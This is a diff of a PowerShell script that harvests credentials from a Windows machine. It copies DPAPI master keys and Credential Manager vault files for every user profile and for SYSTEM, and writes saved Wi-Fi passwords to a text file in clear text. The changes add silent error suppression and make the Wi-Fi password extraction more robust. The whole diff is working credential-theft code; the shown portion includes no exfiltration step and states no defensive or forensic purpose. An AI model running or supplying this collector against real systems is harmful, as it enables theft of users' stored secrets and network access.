@@ -47,7 +47,7 @@ foreach ($u in $users) {
 
     # DPAPI master keys
     $protect = "$($u.FullName)\AppData\Roaming\Microsoft\Protect"
-    if (Test-Path $protect) {
+    if (Test-Path $protect -EA 0) {
         $dpout = "$uout\dpapi_protect"
         New-Item -ItemType Directory -Force -Path $dpout | Out-Null
         Get-ChildItem $protect -Recurse -Force -EA 0 | % {
@@ -60,12 +60,12 @@ foreach ($u in $users) {
 
     # Windows Credential Manager vaults
     $vault = "$($u.FullName)\AppData\Local\Microsoft\Credentials"
-    if (Test-Path $vault) {
+    if (Test-Path $vault -EA 0) {
         $vout = "$uout\wincred_local"; New-Item -ItemType Directory -Force -Path $vout | Out-Null
         Get-ChildItem $vault -Force -EA 0 | % { Copy-Safe $_.FullName "$vout\$($_.Name)" | Out-Null }
     }
     $vaultR = "$($u.FullName)\AppData\Roaming\Microsoft\Credentials"
-    if (Test-Path $vaultR) {
+    if (Test-Path $vaultR -EA 0) {
         $vout = "$uout\wincred_roaming"; New-Item -ItemType Directory -Force -Path $vout | Out-Null
         Get-ChildItem $vaultR -Force -EA 0 | % { Copy-Safe $_.FullName "$vout\$($_.Name)" | Out-Null }
     }
@@ -75,6 +75,7 @@ foreach ($u in $users) {
 $sysprot = "$env:WINDIR\System32\Microsoft\Protect"
 if (Test-Path $sysprot) {
     $sout = "$out\SYSTEM_dpapi"; New-Item -ItemType Directory -Force -Path $sout | Out-Null
+
     Get-ChildItem $sysprot -Recurse -Force -EA 0 | % {
         if (-not $_.PSIsContainer) {
             $rel = $_.FullName.Substring($sysprot.Length).TrimStart('\') -replace '\\','_'
@@ -84,11 +85,15 @@ if (Test-Path $sysprot) {
 }
 
 # Wi-Fi passwords
-netsh wlan show profiles 2>$null | Select-String ":\s+(.+)$" | % {
-    $ssid = $_.Matches[0].Groups[1].Value.Trim()
-    $info = netsh wlan show profile name="`"$ssid`"" key=clear 2>$null
-    if ($info -match 'Key Content\s+:\s+(.+)') {
-        "$ssid : $($Matches[1].Trim())" | Out-File "$out\wifi_passwords.txt" -Append
+$wlan_profiles = netsh wlan show profiles 2>$null
+if ($wlan_profiles) {
+    $wlan_profiles | Select-String "All User Profile\s*:\s*(.+)" | % {
+        $ssid = $_.Matches[0].Groups[1].Value.Trim()
+        $info = (netsh wlan show profile name="`"$ssid`"" key=clear 2>$null) -join "`n"
+        $m = [regex]::Match($info, 'Key Content\s+:\s+(.+)')
+        if ($m.Success) {
+            "$ssid : $($m.Groups[1].Value.Trim())" | Out-File "$out\wifi_passwords.txt" -Append
+        }
     }
 }
 
